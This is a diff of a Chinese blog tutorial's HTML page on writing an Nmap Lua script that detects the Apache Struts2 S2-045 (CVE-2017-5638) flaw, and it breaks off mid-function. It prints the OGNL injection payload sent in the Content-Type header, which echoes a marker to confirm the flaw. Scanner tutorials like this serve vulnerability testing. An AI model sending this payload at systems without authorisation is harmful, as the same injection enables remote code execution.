@@ -1,7 +1,21 @@
-<!doctype html><html lang><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Struts S2-045 Nmap扫描脚本 « 倾旋的博客</title><meta name=description content="倾旋的博客"><meta name=author content="倾旋"><link rel=stylesheet href=/css/Font-Awesome-5.15.3.all.min.css><link rel=stylesheet href=/sass/researcher.min.css><link rel=icon type=image/ico href=https://payloads.online/favicon.ico></head><body><input type=checkbox id=menu-toggle class=menu-toggle>
-<label tabindex=0 for=menu-toggle class=burger><span></span> <span></span> <span></span><div class=burger-text>Menu</div></label><nav class=main-nav><ul><li><a href=/projects/>Projects</a></li><li><a href=/links/>Links</a></li><li><a href=/post/>Posts</a></li><li><a href=/index.xml>Rss</a></li><li><a href=/tools/>Tools</a></li></ul></nav><nav><a href=/ class=all-posts-link>‹ All Posts</a></nav><div id=content><div class=container><h1>Struts S2-045 Nmap扫描脚本</h1><p>本文介绍一下Nmap的扩展插件编写</p><div class=toc-wrapper><div class=post-toc id=post-toc><aside><nav id=TableOfContents><ul><li><a href=#0x00-nmap脚本简介>0x00 Nmap脚本简介</a></li><li><a href=#0x01-实战编写前的思路>0x01 实战编写前的思路</a></li><li><a href=#0x02-第一个函数-前奏>0x02 第一个函数-前奏</a></li><li><a href=#0x03-第二个函数-高潮>0x03 第二个函数-高潮</a></li><li><a href=#0x04-总结>0x04 总结</a></li></ul></nav></aside><a href=# id=toc-toggle></a></div></div><h2 id=0x00-nmap脚本简介>0x00 Nmap脚本简介</h2><p>夜无眠，看了一下Nmap官方的英文API文档(全是English)，瞬间心态崩塌，不想吐槽它们的nmap官网前端太丑了=。=，但是都是大牛啊，挺敬佩开源开发者的。</p><p>Nmap最灵活的就是它的<code>scripts</code>了，在渗透测试中我们经常会用它来扫描服务、漏洞，而且很多脚本也可以用于漏洞利用，总之就是很强大啦～ 具体的介绍在这里：<a href=https://zhuanlan.zhihu.com/p/26618074>Nmap脚本使用指南</a></p><p>看过《Nmap渗透指南》一书，发现书中对于Nmap脚本的编写是轻描淡写，所以本文就利用一个漏洞实例给大家详细说说这个脚本如何开发的。
-<code>PS：并没有说这本书不好，其实很好很好的。</code></p><h2 id=0x01-实战编写前的思路>0x01 实战编写前的思路</h2><p>今天我用<code>Struts S2-045</code>这个漏洞来编写一个漏洞检测脚本。</p><p>PS：此文需要一点<code>Lua</code>语言基础。我也就看了个半调子 ，才写的这个文章，Lua大牛误喷。</p><p>思路： 它主要是给服务器端发送一个http请求，这个请求里的<code>Content-type</code>中就是我们的利用代码了。在这里可以称之为<code>Payload</code>。</p><p>相关链接：<a href=https://zhuanlan.zhihu.com/p/25639832>Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法</a></p><p>我们先把<code>Payload</code>拿出来：</p><pre tabindex=0><code>%{(#nikenb=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(&#39;YES&#39;)).(#o.close())}
-</code></pre><p>可以看到有一个YES，当服务器端相应YES的时候，我们就判定这个服务器存在此漏洞。</p><p>根据官方的文档，我们先载入指定的扩展库：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#75715e>--</span>
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>Struts S2-045 Nmap扫描脚本 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1">
+<link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script></head><body><div class="container-wide wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=article-nav id=article-nav-id><div class=post><div class=post-header><div class=meta><div class=date><span class=day>02</span>
+<span class=rest>Jun 2017</span></div></div><div class=matter><h1 class=title>Struts S2-045 Nmap扫描脚本</h1></div></div><aside class="show-on-mobile toc" id=static-toc><header><h3>Contents</h3></header><nav id=TableOfContents><ol><li><a href=#0x00-nmap脚本简介>0x00 Nmap脚本简介</a></li><li><a href=#0x01-实战编写前的思路>0x01 实战编写前的思路</a></li><li><a href=#0x02-第一个函数-前奏>0x02 第一个函数-前奏</a></li><li><a href=#0x03-第二个函数-高潮>0x03 第二个函数-高潮</a></li><li><a href=#0x04-总结>0x04 总结</a></li></ol></nav></aside><h2 id=0x00-nmap脚本简介>0x00 Nmap脚本简介</h2><p>夜无眠，看了一下Nmap官方的英文API文档(全是English)，瞬间心态崩塌，不想吐槽它们的nmap官网前端太丑了=。=，但是都是大牛啊，挺敬佩开源开发者的。</p><p>Nmap最灵活的就是它的<code>scripts</code>了，在渗透测试中我们经常会用它来扫描服务、漏洞，而且很多脚本也可以用于漏洞利用，总之就是很强大啦～ 具体的介绍在这里：<a href=https://zhuanlan.zhihu.com/p/26618074>Nmap脚本使用指南</a></p><p>看过《Nmap渗透指南》一书，发现书中对于Nmap脚本的编写是轻描淡写，所以本文就利用一个漏洞实例给大家详细说说这个脚本如何开发的。
+<code>PS：并没有说这本书不好，其实很好很好的。</code></p><h2 id=0x01-实战编写前的思路>0x01 实战编写前的思路</h2><p>今天我用<code>Struts S2-045</code>这个漏洞来编写一个漏洞检测脚本。</p><p>PS：此文需要一点<code>Lua</code>语言基础。我也就看了个半调子 ，才写的这个文章，Lua大牛误喷。</p><p>思路： 它主要是给服务器端发送一个http请求，这个请求里的<code>Content-type</code>中就是我们的利用代码了。在这里可以称之为<code>Payload</code>。</p><p>相关链接：<a href=https://zhuanlan.zhihu.com/p/25639832>Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法</a></p><p>我们先把<code>Payload</code>拿出来：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>%{(#nikenb=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(&#39;YES&#39;)).(#o.close())}
+</span></span></code></pre></td></tr></table></div></div><p>可以看到有一个YES，当服务器端相应YES的时候，我们就判定这个服务器存在此漏洞。</p><p>根据官方的文档，我们先载入指定的扩展库：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#75715e>--</span>
 </span></span><span style=display:flex><span><span style=color:#75715e>-- Created by IntelliJ IDEA.</span>
 </span></span><span style=display:flex><span><span style=color:#75715e>-- User: liyingzhe</span>
 </span></span><span style=display:flex><span><span style=color:#75715e>-- Date: 17-6-3</span>
@@ -13,13 +27,39 @@
 </span></span><span style=display:flex><span><span style=color:#66d9ef>local</span> stdnse <span style=color:#f92672>=</span> require <span style=color:#e6db74>&#34;stdnse&#34;</span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>local</span> string <span style=color:#f92672>=</span> require <span style=color:#e6db74>&#34;string&#34;</span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>local</span> vulns <span style=color:#f92672>=</span> require <span style=color:#e6db74>&#34;vulns&#34;</span>
-</span></span></code></pre></div><p>这些基本用于发送HTTP请求、字符串操作、漏洞结果生成、错误调试</p><p>添加一个漏洞描述 ：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span>description <span style=color:#f92672>=</span> <span style=color:#e6db74>[[
+</span></span></code></pre></td></tr></table></div></div><p>这些基本用于发送HTTP请求、字符串操作、漏洞结果生成、错误调试</p><p>添加一个漏洞描述 ：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span>description <span style=color:#f92672>=</span> <span style=color:#e6db74>[[
 </span></span></span><span style=display:flex><span><span style=color:#e6db74>The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 mishandles file upload, which allows remote attackers to execute arbitrary commands via a #cmd= string in a crafted Content-Type HTTP header, as exploited in the wild in March 2017.
 </span></span></span><span style=display:flex><span><span style=color:#e6db74>References:
 </span></span></span><span style=display:flex><span><span style=color:#e6db74>* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
 </span></span></span><span style=display:flex><span><span style=color:#e6db74>* http://www.cnvd.org.cn/flaw/show/CNVD-2017-02474
 </span></span></span><span style=display:flex><span><span style=color:#e6db74>]]</span>
-</span></span></code></pre></div><p>这里我给出了CNVD和CVE编号的详细地址。</p><p>使用结果，这块可有可无，因为都是注释起来的：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#75715e>-- @usage</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里我给出了CNVD和CVE编号的详细地址。</p><p>使用结果，这块可有可无，因为都是注释起来的：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#75715e>-- @usage</span>
 </span></span><span style=display:flex><span><span style=color:#75715e>-- nmap -sV -p- --script struts2-s2-045 &lt;target&gt;</span>
 </span></span><span style=display:flex><span><span style=color:#75715e>-- nmap -sV -p- --script struts2-s2-045 --script-args uri=/aa.action &lt;target&gt;</span>
 </span></span><span style=display:flex><span><span style=color:#75715e>-- @output</span>
@@ -39,13 +79,45 @@
 </span></span><span style=display:flex><span><span style=color:#75715e>-- |_      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638</span>
 </span></span><span style=display:flex><span><span style=color:#75715e>--</span>
 </span></span><span style=display:flex><span><span style=color:#75715e>---</span>
-</span></span></code></pre></div><p>添加作者：
+</span></span></code></pre></td></tr></table></div></div><p>添加作者：
 <code>author = {"email:payloads@aliyun.com bLog:payloads.online company:leafsec.com"}</code>
-这里我给出了我的邮箱、博客，当然只是个字符串，自己想写啥就写啥。但是你要在用户的角度考虑，参数以及说明尽量人性化。</p><h2 id=0x02-第一个函数-前奏>0x02 第一个函数-前奏</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span>portrule <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span>(host,port)
+这里我给出了我的邮箱、博客，当然只是个字符串，自己想写啥就写啥。但是你要在用户的角度考虑，参数以及说明尽量人性化。</p><h2 id=0x02-第一个函数-前奏>0x02 第一个函数-前奏</h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span>portrule <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span>(host,port)
 </span></span><span style=display:flex><span>    <span style=color:#75715e>-- return port.protocol == &#34;tcp&#34; and port.number == 8899 and port.state == &#34;open&#34;</span>
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
-</span></span></code></pre></div><p>这个函数主要用于“第一次检测”，算是一个规则。</p><p><code>portrule</code>变量名不可改变，否则会解析错误。</p><p>当这个函数范围true的时候， 我们的漏洞检测函数才会被自动调用。</p><p>可以看到函数中有一行被注释了，这一行的意思是当前请求的协议是TCP并且端口号是8899并且是端口是打开状态，才会返回true。</p><p>如果当前函数返回false，那么漏洞检测函数就不会被调用，会继续下一个目标或端口的扫描。</p><p>当我们直接返回true，那么每个目标端口都会被传递给漏洞检测函数。</p><p>听我说了这么多，漏洞检测函数到底是什么？</p><h2 id=0x03-第二个函数-高潮>0x03 第二个函数-高潮</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span>action <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span>(host, port)
+</span></span></code></pre></td></tr></table></div></div><p>这个函数主要用于“第一次检测”，算是一个规则。</p><p><code>portrule</code>变量名不可改变，否则会解析错误。</p><p>当这个函数范围true的时候， 我们的漏洞检测函数才会被自动调用。</p><p>可以看到函数中有一行被注释了，这一行的意思是当前请求的协议是TCP并且端口号是8899并且是端口是打开状态，才会返回true。</p><p>如果当前函数返回false，那么漏洞检测函数就不会被调用，会继续下一个目标或端口的扫描。</p><p>当我们直接返回true，那么每个目标端口都会被传递给漏洞检测函数。</p><p>听我说了这么多，漏洞检测函数到底是什么？</p><h2 id=0x03-第二个函数-高潮>0x03 第二个函数-高潮</h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span>action <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span>(host, port)
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>local</span> useragent <span style=color:#f92672>=</span> stdnse.get_script_args(SCRIPT_NAME<span style=color:#f92672>..</span><span style=color:#e6db74>&#34;.useragent&#34;</span>) <span style=color:#f92672>or</span> <span style=color:#66d9ef>nil</span>
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>local</span> cookie <span style=color:#f92672>=</span> stdnse.get_script_args(SCRIPT_NAME<span style=color:#f92672>..</span><span style=color:#e6db74>&#34;.cookie&#34;</span>) <span style=color:#f92672>or</span> <span style=color:#66d9ef>nil</span>
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>local</span> referer <span style=color:#f92672>=</span> stdnse.get_script_args(SCRIPT_NAME<span style=color:#f92672>..</span><span style=color:#e6db74>&#34;.referer&#34;</span>) <span style=color:#f92672>or</span> <span style=color:#66d9ef>nil</span>
@@ -73,10 +145,22 @@
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> vuln_report:make_output(vuln)
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
-</span></span></code></pre></div><p>第二个函数就是<code>action</code>啦～
+</span></span></code></pre></td></tr></table></div></div><p>第二个函数就是<code>action</code>啦～
 <code>stdnse.get_script_args(SCRIPT_NAME..".useragent") or nil</code>
 stdnse用于处理用户的输入，这里调用了get_script_args用来接收用户输入的useragent参数值。
-接下来我调用了一个自定义函数：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>generate_http_req</span>(host, port, uri, useragent,cookie,referer)
+接下来我调用了一个自定义函数：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>generate_http_req</span>(host, port, uri, useragent,cookie,referer)
